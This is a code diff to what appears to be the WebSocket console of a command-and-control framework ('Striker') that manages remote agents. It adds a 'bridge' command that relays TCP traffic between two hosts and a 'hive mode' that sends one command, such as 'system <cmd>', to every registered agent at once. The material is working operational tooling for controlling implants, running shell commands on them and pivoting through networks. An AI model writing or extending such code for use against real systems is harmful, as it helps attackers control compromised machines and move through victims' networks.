@@ -86,6 +86,7 @@ export const setupWS = (httpServer) => {
       "kill <id>": "Kill a running task",
       "tasks": "List running tasks",
       "tunnel <lhost>:<lport> <rhost>:<rport>": "Start a TCP tunnel",
+      "bridge <host1>:<port1> <host2>:<port2>": "Start a TCP bridge b/w 2 servers",
       "system <cmd>": "Run a shell command",
       "writedir <dir>": "Change agent's write directory"
     }
@@ -100,18 +101,25 @@ export const setupWS = (httpServer) => {
       try{
         let input = data.input.toString().trim();
         let agents = [];
+        let hiveMode = false;
         if (input.startsWith("hive ")){
           input = input.substr(5).trim();
           agents = await agentModel.getAgents();
+          client.emit("agent_console_output", {
+            agentID: data.agent.uid, prompt: serverPrompt, msg: `${agents.length} agents selected (hive mode) for command: ${input}`
+          });
+          hiveMode = true;
         }else{
           agents.push(data.agent);
         }
         for (let i = 0; i < agents.length; i++){
           const agent = agents[i];
           const agentID = agent.uid;
-          client.emit("agent_console_output", {
-            agentID, prompt: username, msg: input
-          });
+          if (!hiveMode){
+            client.emit("agent_console_output", {
+              agentID, prompt: username, msg: input
+            });            
+          }
           if (input === "help" || input === "?"){
             const agentHelp = {...helpData};
             if (agent.agentType === 0){ // The main C agent
@@ -220,6 +228,21 @@ export const setupWS = (httpServer) => {
               return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
             taskModel.createTask(username, {
               agentID, taskType: "tunnel", data: {lhost, lport, rhost, rport}
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input.startsWith("bridge ")){
+            let addrs = input.substr(7).trim();
+            let host1 = addrs.split(":")[0].trim()
+            let port1 = parseInt(addrs.split(":")[1].trim().split(" ")[0].trim());
+            let host2 = addrs.split(" ")[1].trim().split(":")[0].trim();
+            let port2 = parseInt(addrs.split(":")[2].trim())
+            if (isNaN(port1) || isNaN(port2))
+              return client.emit("agent_console_output", {agentID, msg: "Invalid port!"});
+            if (!(host1 && port1))
+              return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
+            taskModel.createTask(username, {
+              agentID, taskType: "bridge", data: {host1, port1, host2, port2}
             }).catch(error => {
               client.emit("striker_error", error.message);
             });
